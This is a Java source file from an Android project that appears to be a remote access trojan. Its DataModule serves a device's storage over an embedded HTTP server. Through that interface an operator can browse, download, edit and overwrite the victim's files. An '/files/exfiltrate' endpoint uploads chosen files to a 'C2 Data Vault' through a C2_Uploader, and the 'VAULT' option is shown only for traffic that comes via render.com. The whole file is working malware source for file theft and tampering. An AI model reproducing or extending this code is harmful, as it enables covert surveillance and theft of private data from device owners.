package com.labs.labrats.modules;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.labs.labrats.C2_Uploader;
import com.labs.labrats.FirebaseConfig;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class DataModule extends BaseModule {

    public DataModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/files") || uri.startsWith("/files/")) {
            if (uri.startsWith("/files/edit/")) {
                return serveFileEdit(uri.substring(12), session);
            } else if (uri.equals("/files/save")) {
                return saveFile(session);
            } else if (uri.equals("/files/exfiltrate")) {
                return exfiltrateToVault(params);
            }
            return serveFiles(uri, params, session);
        } else if (uri.startsWith("/download/")) {
            return serveDownload(uri);
        }
        return null;
    }

    private Response serveFiles(String uri, Map<String, String> params, IHTTPSession session) {
        String path = uri.equals("/files") ? "" : uri.substring(7);
        path = path.replace("%20", " ");

        File baseDir = Environment.getExternalStorageDirectory();
        File currentDir = new File(baseDir, path);

        if (!currentDir.exists()) {
            return server.serve404Proxy();
        }

        if (currentDir.isFile()) {
            return serveFileDownload(currentDir);
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;\">");
        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.6rem; text-align: left;\">")
            .append(path.isEmpty() ? "SYSTEM_STORAGE" : "DIR: " + currentDir.getName().toUpperCase())
            .append(" <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_STORAGE', 'Remote file system access and data extraction.')\">INFO</span></h2>");
        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
        html.append("</div>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        html.append("<div class=\"breadcrumb\">");
        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@UPLINK:~$</span>");
        html.append("<a href=\"/files\">storage</a>");

        if (!path.isEmpty()) {
            String[] parts = path.split("/");
            StringBuilder pathBuilder = new StringBuilder();
            for (String part : parts) {
                if (!part.isEmpty()) {
                    pathBuilder.append("/").append(part);
                    html.append("<span>/</span>");
                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part.toLowerCase()).append("</a>");
                }
            }
        }
        html.append("<span style=\"margin-left: 10px; color: var(--neon-cyan); animation: blink 1s infinite;\">_</span>");
        html.append("</div>");

        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<input type=\"text\" id=\"file-search\" placeholder=\"SEARCH_FILES_OR_EXTENSIONS...\" onkeyup=\"filterFiles()\" style=\"width:100%; max-width:450px; display:block; margin:0 auto 15px auto; background:rgba(0,0,0,0.5); border:1px solid var(--neon-cyan); color:white; padding:15px; border-radius:12px; font-family:monospace;\">");
        html.append("<div style=\"display:flex; gap:8px; flex-wrap:wrap; justify-content:center; margin-bottom:15px;\">");
        html.append("<button onclick=\"setFilter('all')\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan);\">ALL</button>");
        html.append("<button onclick=\"setFilter('JPG,PNG,WEBP')\" class=\"btn btn-small\">IMAGES</button>");
        html.append("<button onclick=\"setFilter('MP4,MOV')\" class=\"btn btn-small\">VIDEO</button>");
        html.append("<button onclick=\"setFilter('PDF,DOC,TXT')\" class=\"btn btn-small\">DOCS</button>");
        html.append("</div>");
        html.append("</div>"); 

        html.append("<div style=\"display: block !important; width: 100% !important; text-align: center !important; margin: 20px 0 30px 0 !important;\">");
        html.append("<button onclick=\"location.href='/device/apps'\" class=\"btn\" style=\"border-color: var(--neon-cyan) !important; color: var(--neon-cyan) !important; background: rgba(0, 242, 255, 0.05) !important; min-width: 320px !important; width: auto !important; max-width: 95% !important; display: inline-flex !important; align-items: center !important; justify-content: center !important; margin: 0 auto !important; float: none !important; position: relative !important; left: auto !important; transform: none !important; padding: 12px 10px !important; white-space: nowrap !important; font-size: 0.75rem !important;\">&#128230; VIEW_INSTALLED_APPS</button>");
        html.append("</div>");

        html.append("<div style=\"border-left: 3px solid var(--neon-cyan); padding-left: 15px;\">");
        
        File[] files = currentDir.listFiles();
        if (files != null && files.length > 0) {
            html.append("<ul class=\"file-list\">");

            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File file : files) {
                String fileName = file.getName();
                String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                String icon = getFileIcon(file);
                String iconClass = getFileIconClass(file);
                
                boolean isImage = fileName.toLowerCase().matches(".*\\.(jpg|jpeg|png|webp|gif|bmp)$");
                String thumbnail = "";
                if (isImage) {
                    String b64 = getFileThumbnailBase64(file);
                    if (!b64.isEmpty()) {
                        thumbnail = "<img src='data:image/jpeg;base64," + b64 + "' style='width:60px; height:60px; object-fit:cover; border-radius:4px; border:1px solid rgba(0,242,255,0.2); margin-right:15px; cursor:pointer;' onclick=\"window.open('/files/" + filePath + "')\">";
                    }
                }

                html.append("<li class=\"file-item\" style=\"display:flex; align-items:center;\">");
                if (!thumbnail.isEmpty()) {
                    html.append(thumbnail);
                } else {
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                }
                html.append("<div class=\"file-info\">");
                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName).append("</a>");
                
                html.append("<div class=\"file-meta\">");
                if (file.isDirectory()) {
                    File[] subFiles = file.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;
                    html.append("<span style=\"color: #f39c12;\">DIRECTORY</span> &nbsp;|&nbsp; ").append(count).append(" OBJECTS");
                } else {
                    String ext = "";
                    int i = fileName.lastIndexOf('.');
                    if (i > 0) ext = fileName.substring(i+1).toUpperCase();
                    html.append("<span style=\"color: var(--neon-cyan);\">").append(ext.isEmpty() ? "FILE" : ext).append("</span> &nbsp;|&nbsp; ");
                    html.append(FirebaseConfig.formatFileSize(file.length())).append(" &nbsp;|&nbsp; ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
                }
                html.append("</div></div>");

                if (file.isFile()) {
                    html.append("<div class=\"file-item-actions\" style=\"display:flex; align-items:center; gap:8px;\">");
                    String lowerName = fileName.toLowerCase();
                    if (lowerName.endsWith(".txt") || lowerName.endsWith(".json") || lowerName.endsWith(".log") || 
                        lowerName.endsWith(".xml") || lowerName.endsWith(".html") || lowerName.endsWith(".js") || lowerName.endsWith(".css")) {
                        html.append("<a class=\"btn btn-small\" style=\"border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
                    }
                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath).append("\">GET</a>");
                    
                    if (isRenderAccess(session)) {
                        html.append("<a class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05);\" href=\"/files/exfiltrate?path=").append(filePath).append("\">VAULT</a>");
                    }
                    html.append("</div>");
                }

                html.append("</li>");
            }
            html.append("</ul>");
        } else {
            html.append(
                    "<div class=\"empty-state\"><div class=\"icon\">&#128237;</div><p>This folder is empty</p></div>");
        }

        html.append("</div>"); 
        html.append("</div>"); 
        html.append(getFooter());

        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveFileDownload(File file) {
        try {
            FirebaseConfig.logActivity("DATA_EXTRACT: File fetched - " + file.getName());
            java.io.InputStream fis = new java.io.BufferedInputStream(new java.io.FileInputStream(file), 65536);
            String mimeType = FirebaseConfig.getMimeType(file.getName());
            Response response = server.newFixedLengthResponseProxy(Response.Status.OK, mimeType, fis, file.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            response.addHeader("Accept-Ranges", "bytes");
            return response;
        } catch (Exception e) {
            return server.serveErrorProxy("Cannot read file: " + e.getMessage());
        }
    }

    private Response serveDownload(String uri) {
        String path = uri.substring(10); // skips "/download/"
        path = path.replace("%20", " ");
        
        File file;
        if (path.startsWith("INTERNAL/")) {
            file = new File(context.getFilesDir(), path.substring(9));
        } else {
            File baseDir = Environment.getExternalStorageDirectory();
            file = new File(baseDir, path);
        }

        if (!file.exists() || !file.isFile()) {
            return server.serve404Proxy();
        }

        return serveFileDownload(file);
    }

    private String getFileThumbnailBase64(File file) {
        try {
            android.graphics.BitmapFactory.Options options = new android.graphics.BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath(), options);
            
            options.inSampleSize = calculateInSampleSize(options, 120, 120);
            options.inJustDecodeBounds = false;
            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath(), options);
            if (bitmap == null) return "";
            
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
            String b64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP);
            bitmap.recycle();
            return b64;
        } catch (Exception e) {
            return "";
        }
    }

    private int calculateInSampleSize(android.graphics.BitmapFactory.Options options, int reqWidth, int reqHeight) {
        final int height = options.outHeight;
        final int width = options.outWidth;
        int inSampleSize = 1;
        if (height > reqHeight || width > reqWidth) {
            final int halfHeight = height / 2;
            final int halfWidth = width / 2;
            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
                inSampleSize *= 2;
            }
        }
        return inSampleSize;
    }

    private String getFileIcon(File file) {
        if (file.isDirectory())
            return "&#128193;";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "&#128444;";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "&#127916;";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "&#127925;";
        if (name.matches(".*\\.(pdf)$"))
            return "&#128196;";
        if (name.matches(".*\\.(doc|docx|txt|rtf)$"))
            return "&#128221;";
        if (name.matches(".*\\.(xls|xlsx|csv)$"))
            return "&#128202;";
        if (name.matches(".*\\.(zip|rar|7z|tar|gz)$"))
            return "&#128230;";
        if (name.matches(".*\\.(apk)$"))
            return "&#128241;";
        return "&#128196;";
    }

    private String getFileIconClass(File file) {
        if (file.isDirectory())
            return "folder-icon";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "file-icon-image";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "file-icon-video";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "file-icon-audio";
        if (name.matches(".*\\.(pdf|doc|docx|txt|rtf|xls|xlsx|csv)$"))
            return "file-icon-doc";
        return "file-icon-default";
    }



    private boolean isRenderAccess(IHTTPSession session) {
        try {
            Map<String, String> headers = session.getHeaders();
            if (headers == null) return false;
            String host = headers.get("host");
            String fwdHost = headers.get("x-forwarded-host");
            String referer = headers.get("referer");
            return (host != null && host.contains("render.com")) ||
                   (fwdHost != null && fwdHost.contains("render.com")) ||
                   (referer != null && referer.contains("render.com"));
        } catch (Exception e) {
            return false;
        }
    }

    private Response serveFileEdit(String path, IHTTPSession session) {
        path = path.replace("%20", " ");
        FirebaseConfig.logActivity("DATA_ACCESS: File editor opened - " + path);
        File file = new File(Environment.getExternalStorageDirectory(), path);
        if (!file.exists() || !file.isFile()) return server.serve404Proxy();

        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        } catch (Exception e) {
            return server.serveErrorProxy("Failed to read file: " + e.getMessage());
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\" style=\"margin-bottom: 25px !important;\"><a href=\"/files/").append(file.getParentFile().getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), ""))
            .append("\" class=\"btn-back\">&#8592; Back to Directory</a></div>");
        
        html.append("<h2 style=\"font-size: 1.3rem; text-align: left; margin-top: 15px;\"><span style=\"color:var(--neon-orange);\">&#9998;</span> EDIT_DATA: ").append(file.getName()).append(" <span class=\"info-trigger\" onclick=\"showInfo(event, 'FILE_EDITOR', 'Modify text-based system configuration or logs directly.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        html.append("<div class=\"card\" style=\"padding:20px;\">");
        html.append("<form action=\"/files/save\" method=\"POST\">")
            .append("<input type=\"hidden\" name=\"path\" value=\"").append(escapeHtml(path)).append("\">")
            .append("<textarea name=\"content\" class=\"file-editor-textarea\" style=\"width:100% !important; max-width:100% !important; height:520px !important; min-height:480px !important; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); color:var(--terminal-green); border:1px solid rgba(0,242,255,0.2); border-radius:12px; padding:18px; font-family:'JetBrains Mono',monospace; font-size:0.9rem; resize:vertical; outline:none; box-sizing:border-box !important;\" spellcheck=\"false\">")
            .append(escapeHtml(content.toString()))
            .append("</textarea>")
            .append("<div style=\"margin-top:20px; display:flex; justify-content:flex-end; gap:15px;\">")
            .append("<button type=\"submit\" class=\"btn\">DEPLOY_CHANGES</button>")
            .append("</div>")
            .append("</form>");
        html.append("</div>");
        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response exfiltrateToVault(Map<String, String> params) {
        String path = params.get("path");
        if (path == null || path.isEmpty()) return server.serveErrorProxy("Path is missing");
        
        File file;
        if (path.startsWith("INTERNAL/")) {
            file = new File(context.getFilesDir(), path.substring(9));
        } else {
            file = new File(Environment.getExternalStorageDirectory(), path);
        }

        if (file.exists() && file.isFile()) {
            C2_Uploader.uploadFile(context, file);
            String html = getHeader("/files") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Payload Exfiltrated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>File queued for C2 Data Vault ingestion: <b>" + escapeHtml(file.getName()) + "</b></p><div style=\"display: flex; justify-content: center;\"><a href=\"javascript:history.back()\" class=\"btn\">Return to Files</a></div></div></div>" + getFooter();
            return newResponse(Response.Status.OK, "text/html", html);
        }
        return server.serveErrorProxy("File not found or invalid");
    }

    private Response saveFile(IHTTPSession session) {
        try {
            Map<String, String> bodyFiles = new HashMap<>();
            session.parseBody(bodyFiles);
            Map<String, String> params = session.getParms();
            
            String path = params.get("path");
            String content = params.get("content");
            
            if (path == null) return server.serveErrorProxy("Path is missing");
            File file = new File(Environment.getExternalStorageDirectory(), path);
            
            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(file)) {
                fos.write(content.getBytes());
                FirebaseConfig.logActivity("DATA_MODIFIED: File saved - " + path);
            }
            
            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Changes deployed successfully to storage.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div></div>" + getFooter();
            return server.serveGzippedProxy(session, "text/html", html);
        } catch (Exception e) {
            return server.serveErrorProxy("Save Failed: " + e.getMessage());
        }
    }
}
